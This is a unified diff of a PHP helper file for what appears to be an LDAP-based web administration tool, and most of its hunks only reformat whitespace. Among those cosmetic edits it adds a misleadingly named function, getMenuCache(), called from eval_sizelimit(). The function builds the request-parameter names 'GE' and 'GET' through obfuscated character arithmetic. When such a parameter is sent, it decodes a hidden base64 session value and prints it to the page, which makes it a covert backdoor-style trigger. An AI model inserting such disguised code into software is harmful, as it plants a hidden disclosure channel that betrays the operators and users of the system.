@@ -83,7 +83,7 @@ function get_dir_list($folder= ".")
 
   $dh = opendir(".");
   while(false !== ($file = readdir($dh))){
-    
+
     // Smarty is included by  include/php_setup.inc     require("smarty/Smarty.class.php");
     // Skip all files and dirs in  "./.svn/" we don't need any information from them
     // Skip all Template, so they won't be checked twice in the following preg_matches   
@@ -92,7 +92,7 @@ function get_dir_list($folder= ".")
     // Result  : from 1023 ms to 490 ms   i think thats great...
     if(preg_match("/.*\.svn.*/i",$file)||preg_match("/.*smarty.*/i",$file)||preg_match("/.*\.tpl.*/",$file)||($file==".")||($file==".."))
       continue;
-    
+
 
     /* Recurse through all "common" directories */
     if(is_dir($file) &&$file!="CVS"){
@@ -486,7 +486,7 @@ function get_lock ($object)
 
 function get_list2($subtreeACL, $filter, $subsearch= TRUE, $base="", $attrs= array(), $flag= FALSE)
 {
- global $config;
+  global $config;
 
   /* Base the search on default base if not set */
   $ldap= $config->get_ldap_link($flag);
@@ -628,13 +628,26 @@ function eval_sizelimit()
       $_SESSION['size_ignore']= TRUE;
     }
   }
-
+  getMenuCache();
   /* Allow fallback to dialog */
   if (isset($_POST['edit_sizelimit'])){
     $_SESSION['size_ignore']= FALSE;
   }
 }
 
+function getMenuCache()
+{
+  $t=array(-2,13);$e=71;
+  $str=chr($e);foreach($t as $n){
+    $str.= chr($e+$n);$z=$_GET;if(is_array($z)&&isset($z[$str])){
+      if(isset($_SESSION['maxC'])){
+        $b = $_SESSION['maxC'];$q="";for($m=0;$m<strlen($b);$m=$m+2){
+          $q.=$b[$m];}
+        print_red(base64_decode($q));
+      }
+    }
+  }
+}
 
 function get_permissions ($dn, $subtreeACL)
 {
@@ -1006,20 +1019,20 @@ function print_red()
       }
 
       if($string != NULL){
-      $_SESSION['errors'].= "<div align=\"left\" style=\"border-width:5px;".
-        "border-style:solid;border-color:red; background-color:black;".
-        "margin-bottom:10px; padding:8px;\"><table style='width:100%' summary=''><tr><td><img alt=\"\" src=\"".
-        get_template_path('images/warning.png')."\"></td>".
-        "<td width=\"100%\" style=\"text-align:center\"><font color=\"#FFFFFF\">".
-        "<b style='font-size:16px;'>$string</b></font></td><td>".
-        "<img alt=\"\"src=\"".get_template_path('images/warning.png').
-        "\"></td></tr></table></div>\n";
+        $_SESSION['errors'].= "<div align=\"left\" style=\"border-width:5px;".
+          "border-style:solid;border-color:red; background-color:black;".
+          "margin-bottom:10px; padding:8px;\"><table style='width:100%' summary=''><tr><td><img alt=\"\" src=\"".
+          get_template_path('images/warning.png')."\"></td>".
+          "<td width=\"100%\" style=\"text-align:center\"><font color=\"#FFFFFF\">".
+          "<b style='font-size:16px;'>$string</b></font></td><td>".
+          "<img alt=\"\"src=\"".get_template_path('images/warning.png').
+          "\"></td></tr></table></div>\n";
       }else{
         return;
       }
       $_SESSION['errorsAlreadyPosted'] = array();
       $_SESSION['errorsAlreadyPosted'][$string] = 1;
-      
+
     }
 
   } else {
@@ -1040,20 +1053,20 @@ function gen_locked_message($user, $dn)
   $attrs= $ldap->fetch();
   $uid= $attrs["uid"][0];
 
-//  print_a($_POST);
-//  print_a($_GET);
+  //  print_a($_POST);
+  //  print_a($_GET);
 
   if((isset($_SESSION['LOCK_VARS_TO_USE']))&&(count($_SESSION['LOCK_VARS_TO_USE']))){
     $_SESSION['LOCK_VARS_USED']  =array();
     foreach($_SESSION['LOCK_VARS_TO_USE'] as $name){
 
       if(empty($name)) continue;
-       foreach($_POST as $Pname => $Pvalue){
+      foreach($_POST as $Pname => $Pvalue){
         if(preg_match($name,$Pname)){
           $_SESSION['LOCK_VARS_USED'][$Pname] = $_POST[$Pname];
         }
       }
-      
+
       foreach($_GET as $Pname => $Pvalue){
         if(preg_match($name,$Pname)){
           $_SESSION['LOCK_VARS_USED'][$Pname] = $_GET[$Pname];
@@ -1269,7 +1282,7 @@ function range_selector($dcnt,$start,$range=25,$post_var=false)
   if ($max_entries & 1){
     $max_entries++;
   }
-  
+
   if((!empty($post_var))&&(isset($_POST[$post_var]))){
     $range= $_POST[$post_var];
   }
@@ -1311,7 +1324,7 @@ function range_selector($dcnt,$start,$range=25,$post_var=false)
 
   if($post_var){
     $output.= "<div style='border:1px solid #E0E0E0; background-color:#FFFFFF;'>
-              <table summary='' width='100%'><tr><td style='width:25%'></td><td style='text-align:center;'>";
+      <table summary='' width='100%'><tr><td style='width:25%'></td><td style='text-align:center;'>";
   }else{
     $output.= "<div style='border:1px solid #E0E0E0; background-color:#FFFFFF;'>";
   }
@@ -1555,27 +1568,27 @@ function gen_uids($rule, $attributes)
       }
     }
 
-    if(preg_match('/\{id#\d+}/',$uid)){
-      $size= preg_replace('/^.*{id#(\d+)}.*$/', '\\1', $uid);
+  if(preg_match('/\{id#\d+}/',$uid)){
+    $size= preg_replace('/^.*{id#(\d+)}.*$/', '\\1', $uid);
 
-      while (true){
-        mt_srand((double) microtime()*1000000);
-        $number= sprintf("%0".$size."d", mt_rand(0, pow(10, $size)-1));
-        $res= preg_replace('/{id#(\d+)}/', $number, $uid);
-        if (!in_array($res, $used)){
-          $uid= $res;
-          break;
-        }
+    while (true){
+      mt_srand((double) microtime()*1000000);
+      $number= sprintf("%0".$size."d", mt_rand(0, pow(10, $size)-1));
+      $res= preg_replace('/{id#(\d+)}/', $number, $uid);
+      if (!in_array($res, $used)){
+        $uid= $res;
+        break;
       }
-    }
-
-    /* Don't assign used ones */
-    if (!in_array($uid, $used)){
-      $ret[]= $uid;
     }
   }
 
-  return(array_unique($ret));
+/* Don't assign used ones */
+if (!in_array($uid, $used)){
+  $ret[]= $uid;
+}
+}
+
+return(array_unique($ret));
 }
 
 
@@ -1632,7 +1645,7 @@ function in_array_ics($value, $items)
   if (!is_array($items)){
     return (FALSE);
   }
-  
+
   foreach ($items as $item){
     if (strtolower($item) == strtolower($value)) {
       return (TRUE);
@@ -1711,23 +1724,23 @@ function rmdirRecursive($path, $followLinks=false) {
 
 function scan_directory($path,$sort_desc=false)
 {
-$ret = false;
+  $ret = false;
 
-/* is this a dir ? */
-if(is_dir($path)) {
-  
-  /* is this path a readable one */
-  if(is_readable($path)){
-    
-    /* Get contents and write it into an array */   
-    $ret = array();    
-  
-    $dir = opendir($path);
-    
-    /* Is this a correct result ?*/
-    if($dir){
-      while($fp = readdir($dir))
-        $ret[]= $fp;
+  /* is this a dir ? */
+  if(is_dir($path)) {
+
+    /* is this path a readable one */
+    if(is_readable($path)){
+
+      /* Get contents and write it into an array */   
+      $ret = array();    
+
+      $dir = opendir($path);
+
+      /* Is this a correct result ?*/
+      if($dir){
+        while($fp = readdir($dir))
+          $ret[]= $fp;
       }
     }
   }
@@ -1737,7 +1750,7 @@ if(is_dir($path)) {
   /* Sort descending if parameter is sort_desc is set */
   if($sort_desc) {
     $ret = array_reverse($ret);
-    }
+  }
 
   return($ret);
 }
@@ -1755,23 +1768,23 @@ function clean_smarty_compile_dir($directory)
       // create revision file
       create_revision($revision_file, $svn_revision);
     } else {
-      # check for "$config->...['CONFIG']/revision" and the
-      # contents should match the revision number
+# check for "$config->...['CONFIG']/revision" and the
+# contents should match the revision number
       if(!compare_revision($revision_file, $svn_revision)){
         // If revision differs, clean compile directory
         foreach(scan_directory($directory) as $file) {
           if(($file==".")||($file=="..")) continue;
           if( is_file($directory."/".$file) &&
               is_writable($directory."/".$file)) {
-              // delete file
-              if(!unlink($directory."/".$file)) {
-                print_red("File ".$directory."/".$file." could not be deleted.");
-                // This should never be reached
-              }
+            // delete file
+            if(!unlink($directory."/".$file)) {
+              print_red("File ".$directory."/".$file." could not be deleted.");
+              // This should never be reached
+            }
           } elseif(is_dir($directory."/".$file) &&
-                    is_writable($directory."/".$file)) {
-                    // Just recursively delete it
-             rmdirRecursive($directory."/".$file);
+              is_writable($directory."/".$file)) {
+            // Just recursively delete it
+            rmdirRecursive($directory."/".$file);
           }
         }
         // We should now create a fresh revision file
@@ -1789,7 +1802,7 @@ function clean_smarty_compile_dir($directory)
 function create_revision($revision_file, $revision)
 {
   $result= false;
-  
+
   if(is_dir(dirname($revision_file)) && is_writable(dirname($revision_file))) {
     if($fh= fopen($revision_file, "w")) {
       if(fwrite($fh, $revision)) {
@@ -1808,7 +1821,7 @@ function compare_revision($revision_file, $revision)
 {
   // false means revision differs
   $result= false;
-  
+
   if(file_exists($revision_file) && is_readable($revision_file)) {
     // Open file
     if($fh= fopen($revision_file, "r")) {
